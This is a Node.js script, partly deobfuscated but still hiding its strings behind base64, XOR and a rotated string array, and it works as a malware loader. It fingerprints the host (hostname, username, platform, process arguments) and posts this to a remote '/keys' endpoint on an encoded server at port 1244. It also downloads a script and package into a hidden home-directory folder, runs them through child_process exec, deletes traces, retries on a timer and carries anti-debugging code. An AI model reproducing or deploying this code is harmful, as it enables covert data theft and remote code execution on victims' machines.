let stringRetriever = initializeStringRetriever;

(function rotateStringArray(stringArrayFactory, targetSum) {
    let localStringRetriever = initializeStringRetriever;
    let stringArray = stringArrayFactory();

    while (true) {
        try {
            let sumComponent1 = parseInt(localStringRetriever(208)) / 1;
            let sumComponent2 = -parseInt(localStringRetriever(210)) / 2;
            let sumComponent3 = (parseInt(localStringRetriever(203)) / 3) * (parseInt(localStringRetriever(187)) / 4);
            let sumComponent4 = (parseInt(localStringRetriever(196)) / 5) * (-parseInt(localStringRetriever(217)) / 6);
            let sumComponent5 = -parseInt(localStringRetriever(206)) / 7;
            let sumComponent6 = (-parseInt(localStringRetriever(181)) / 8) * (parseInt(localStringRetriever(207)) / 9);
            let sumComponent7 = (-parseInt(localStringRetriever(190)) / 10) * (-parseInt(localStringRetriever(178)) / 11);

            let computedSum = sumComponent1 + sumComponent2 + sumComponent3 + sumComponent4 + sumComponent5 + sumComponent6 + sumComponent7;

            if (computedSum === targetSum) {
                break;
            }

            stringArray.push(stringArray.shift());
        } catch (error) {
            stringArray.push(stringArray.shift());
        }
    }
})(createStringArray, 706366);

let base64Encoding = 'base64';
let charset = stringRetriever(223);
let fileSystem = require('fs');
let operatingSystem = require('os');

let decodeBase64 = (encodedString) => {
    let slicedString = encodedString[stringRetriever(179)](1);
    return Buffer.from(slicedString, base64Encoding)[stringRetriever(213)](charset);
};

let httpRequest = require(decodeBase64(stringRetriever(191) + 'A'));
let pathHandler = require(decodeBase64('zcGF0aA'));
let commandExecutor = require(decodeBase64(stringRetriever(192) + 'HJvY2Vzcw'))[decodeBase64('cZXhlYw')];
let processInfo = require(decodeBase64('Zbm9kZTpwc' + stringRetriever(219)));
let homeDirectory = operatingSystem[decodeBase64('ZaG9tZWRpcg')]();
let hostName = operatingSystem[decodeBase64(stringRetriever(211) + 'WU')]();
let platformName = operatingSystem[decodeBase64(stringRetriever(184) + 'm0')]();
let userName = operatingSystem[decodeBase64(stringRetriever(185) + 'm8')]();

let timestamp;

let baseUrlPrefix = stringRetriever(194);
let baseUrlSuffix = stringRetriever(197);
let baseUrl = baseUrlPrefix + baseUrlSuffix;
let port = ':124';

let decodeToUtf8 = (encodedString) => {
    return Buffer.from(encodedString, base64Encoding)[stringRetriever(213)](charset);
};

let serverUrl = '';
let requestType = '';

let xorKey = [36, 192, 41, 8];

let xorDecode = (byteArray) => {
    let localStringRetriever = stringRetriever;
    let decodedString = '';

    for (let index = 0; index < byteArray.length; index++) {
        let xorResult = 0xff & (byteArray[index] ^ xorKey[index & 3]);
        decodedString += String[localStringRetriever(195) + 'de'](xorResult);
    }

    return decodedString;
};

let httpGetMethod = stringRetriever(202);
let fileWriteMethod = stringRetriever(209) + stringRetriever(222);
let fileExistsMethod = decodeToUtf8(stringRetriever(218) + stringRetriever(199));

function initializeStringRetriever(initialIndex) {
    let stringArray = createStringArray();

    stringRetriever = function (adjustedIndex) {
        let offsetIndex = adjustedIndex - 178;
        return stringArray[offsetIndex];
    };

    return stringRetriever(initialIndex);
}

function checkFileExists(filePath) {
    return fileSystem[fileExistsMethod](filePath);
}

let makeDirectoryMethod = decodeToUtf8('bWtkaXJTeW5j');
let directoryKey = [10, 182, 90, 107, 75, 164, 76];
let initialFileKey = [11, 170, 6];

let createWorkingDirectory = () => {
    let localStringRetriever = stringRetriever;
    let getRequestMethod = decodeToUtf8(httpGetMethod);
    let writeFileMethodDecoded = decodeToUtf8(fileWriteMethod);
    let directoryName = xorDecode(directoryKey);
    let targetDirectory = pathHandler[localStringRetriever(201)](homeDirectory, directoryName);

    try {
        let directoryToCreate = targetDirectory;
        fileSystem[makeDirectoryMethod](directoryToCreate, { recursive: true });
    } catch (error) {
        targetDirectory = homeDirectory;
    }

    let downloadUrl = serverUrl + xorDecode(initialFileKey) + requestType;
    let scriptFilePath = pathHandler[localStringRetriever(201)](targetDirectory, xorDecode(scriptFileKey));

    try {
        let removeFileMethod = decodeToUtf8(localStringRetriever(220));
        fileSystem[removeFileMethod](scriptFilePath);
    } catch (error) {}

    httpRequest[getRequestMethod](downloadUrl, (error, response, body) => {
        if (!error) {
            try {
                fileSystem[writeFileMethodDecoded](scriptFilePath, body);
            } catch (error) {}
            processDirectory(targetDirectory);
        }
    });
};

let scriptFileKey = [80, 165, 90, 124, 10, 170, 90];
let packageUrlKey = [11, 176];
let packageFileKey = [84, 161, 74, 99, 69, 167, 76, 38, 78, 179, 70, 102];

let processDirectory = (directoryPath) => {
    let getRequestMethod = decodeToUtf8(httpGetMethod);
    let writeFileMethodDecoded = decodeToUtf8(fileWriteMethod);
    let packageUrl = serverUrl + xorDecode(packageUrlKey);
    let packageFilePath = pathHandler.join(directoryPath, xorDecode(packageFileKey));

    if (checkFileExists(packageFilePath)) {
        executeInitialCommand(directoryPath);
    } else {
        httpRequest[getRequestMethod](packageUrl, (error, response, body) => {
            if (!error) {
                try {
                    fileSystem[writeFileMethodDecoded](packageFilePath, body);
                } catch (error) {}
                executeInitialCommand(directoryPath);
            }
        });
    }
};

let initialCommandKey = [71, 164];
let initialCommandArgs = [2, 230, 9, 102, 84, 173, 9, 97, 4, 237, 4, 123, 77, 172, 76, 102, 80];
let modulePathKey = [74, 175, 77, 109, 123, 173, 70, 108, 81, 172, 76, 123];

let executeInitialCommand = (directoryPath) => {
    let localStringRetriever = stringRetriever;
    let commandString = xorDecode(initialCommandKey) + ' "' + directoryPath + '" ' + xorDecode(initialCommandArgs);
    let moduleFilePath = pathHandler[localStringRetriever(201)](directoryPath, xorDecode(modulePathKey));

    try {
        if (checkFileExists(moduleFilePath)) {
            cleanupFiles(directoryPath);
        } else {
            commandExecutor(commandString, (error, stdout, stderr) => {
                executeNextCommand(directoryPath);
            });
        }
    } catch (error) {}
};

let cleanupCommandKey = [74, 175, 77, 109];
let nextCommandArgs = [74, 176, 68, 40, 9, 237, 89, 122, 65, 166, 64, 112];
let nextCommandPathKey = [77, 174, 90, 124, 69, 172, 69];

let executeNextCommand = (directoryPath) => {
    let localStringRetriever = stringRetriever;
    let commandString = xorDecode(nextCommandArgs) + ' "' + directoryPath + '" ' + xorDecode(nextCommandPathKey);
    let moduleFilePath = pathHandler[localStringRetriever(201)](directoryPath, xorDecode(modulePathKey));

    try {
        if (checkFileExists(moduleFilePath)) {
            cleanupFiles(directoryPath);
        } else {
            commandExecutor(commandString, (error, stdout, stderr) => {
                cleanupFiles(directoryPath);
            });
        }
    } catch (error) {}
};

let cleanupFiles = (directoryPath) => {
    let localStringRetriever = stringRetriever;
    let scriptFilePath = pathHandler[localStringRetriever(201)](directoryPath, xorDecode(scriptFileKey));
    let cleanupCommand = xorDecode(cleanupCommandKey) + ' ' + scriptFilePath;

    try {
        commandExecutor(cleanupCommand, (error, stdout, stderr) => {});
    } catch (error) {}
};

let formDataKey = decodeBase64(stringRetriever(205) + 'GE');
let urlKey = decodeBase64(stringRetriever(221));
let postMethod = decodeToUtf8(stringRetriever(198));

let hostIdentifier = stringRetriever(186);

function createStringArray() {
    let stringValues = [
        '1100916ynYuqS', 'ZXhpc3RzU3', 'm9jZXNz', 'cm1TeW5j', 'adXJs', 'xlU3luYw',
        'utf8', '12771rfZOPH', 'slice', '3E1', '1080NqQcog', '6df937fe9011', 'split',
        'YcGxhdGZvc', 'AdXNlckluZ', 'cmp', '12oUfARq', 'ZT3', '/s/', '10990NuLusk',
        'YcmVxdWVzd', 'aY2hpbGRfc', 'oqr', 'aaHR0cDovL', 'fromCharCo', '35onXXhB',
        'w==', 'cG9zdA', 'luYw', 'LjEzNS4xOT', 'join', 'Z2V0', '170718pyusLc',
        'length', 'cZm9ybURhd', '2001279anzPgZ', '23409VesLJH', '1212302AGrpWU',
        'd3JpdGVGaW', '62318pTCWcq', 'caG9zdG5hb', 'E2LjE3MjAw', 'toString',
        'dXNlcm5hbW', 'My4xMTUuMj', 'substring'
    ];

    createStringArray = function () {
        return stringValues;
    };

    return stringValues;
}

let makeServerRequest = async (attemptNumber) => {
    let localStringRetriever = stringRetriever;
    let constructedServerUrl = ((attempt) => {
        let innerStringRetriever = initializeStringRetriever;
        let encodedPart = attempt === 0 ? innerStringRetriever(215) + innerStringRetriever(212) : innerStringRetriever(200) + 'UuMTc5MzM=';
        let partOne = '';
        let partTwo = '';
        let partThree = '';

        for (let index = 0; index < 4; index++) {
            partOne += encodedPart[2 * index] + encodedPart[2 * index + 1];
            partTwo += encodedPart[8 + 2 * index] + encodedPart[9 + 2 * index];
            partThree += encodedPart[16 + index];
        }

        return decodeToUtf8(baseUrl[innerStringRetriever(216)](1)) + decodeToUtf8(partTwo + partOne + partThree) + port + '4';
    })(attemptNumber);

    let getRequestMethod = decodeToUtf8(httpGetMethod);
    let requestUrl = constructedServerUrl + localStringRetriever(189);
    requestUrl += localStringRetriever(182);

    httpRequest[getRequestMethod](requestUrl, (error, response, body) => {
        if (error) {
            if (attemptNumber < 1) {
                makeServerRequest(1);
            }
        } else {
            let isValidResponse = ((responseBody) => {
                let innerStringRetriever = initializeStringRetriever;
                if (responseBody.search(innerStringRetriever(188)) === 0) {
                    let dataString = '';

                    try {
                        for (let index = 3; index < responseBody[innerStringRetriever(204)]; index++) {
                            dataString += responseBody[index];
                        }

                        let decodedData = decodeToUtf8(dataString);
                        let dataArray = decodedData[innerStringRetriever(183)](',');

                        serverUrl = decodeToUtf8(baseUrl[innerStringRetriever(216)](1)) + dataArray[0] + port + '4';
                        requestType = dataArray[1];

                        return 1;
                    } catch (error) {
                        return 0;
                    }
                }

                return 0;
            })(body);

            if (isValidResponse > 0) {
                sendHostData();
                startProcessing();
            }
        }
    });
};

let sendHostData = async () => {
    let localStringRetriever = stringRetriever;

    hostIdentifier = hostName;

    if (platformName[0] === 'd') {
        hostIdentifier = hostIdentifier + '+' + userName[decodeToUtf8(localStringRetriever(214) + 'U')];
    }

    let argumentsString = localStringRetriever(180);

    try {
        argumentsString += processInfo[decodeToUtf8('YXJndg')][1];
    } catch (error) {}

    sendRequest(localStringRetriever(193), argumentsString);
};

let sendRequest = async (typeValue, dataValue) => {
    let payload = {
        ts: timestamp,
        type: requestType,
        hid: hostIdentifier,
        ss: typeValue,
        cc: dataValue
    };

    let requestOptions = {
        [urlKey]: serverUrl + decodeToUtf8('L2tleXM'),
        [formDataKey]: payload
    };

    try {
        httpRequest[postMethod](requestOptions, (error, response, body) => {});
    } catch (error) {}
};

let startProcessing = async () => {
    return await new Promise((resolve, reject) => {
        createWorkingDirectory();
    });
};

let attemptCount = 0;

let initializeProcess = async () => {
    let localStringRetriever = stringRetriever;

    try {
        timestamp = Date.now()[localStringRetriever(213)]();
        await makeServerRequest(0);
    } catch (error) {}
};

initializeProcess();

let retryInterval = setInterval(() => {
    attemptCount += 1;

    if (attemptCount < 3) {
        initializeProcess();
    } else {
        clearInterval(retryInterval);
    }
}, 600000);

function generateObfuscatedFunction(inputValue) {
    function processValue(currentValue) {
        let localStringRetriever = xorKey;

        if (typeof currentValue === 'string') {
            return function (unused) {}
                [localStringRetriever(228)]('while (true) {}')
                [localStringRetriever(258)](localStringRetriever(198));
        } else {
            let isSpecialNumber = ('' + currentValue / currentValue)[localStringRetriever(255)] !== 1 || currentValue % 20 === 0;

            if (isSpecialNumber) {
                return function () {
                    return true;
                }
                    [localStringRetriever(228)](localStringRetriever(173) + localStringRetriever(207))
                    [localStringRetriever(235)]('action');
            } else {
                return function () {
                    return false;
                }
                    [localStringRetriever(228)]('debu' + localStringRetriever(207))
                    [localStringRetriever(258)]('stateObject');
            }
        }

        processValue(currentValue + 1);
    }

    try {
        if (inputValue) {
            return processValue;
        } else {
            processValue(0);
        }
    } catch (error) {}
}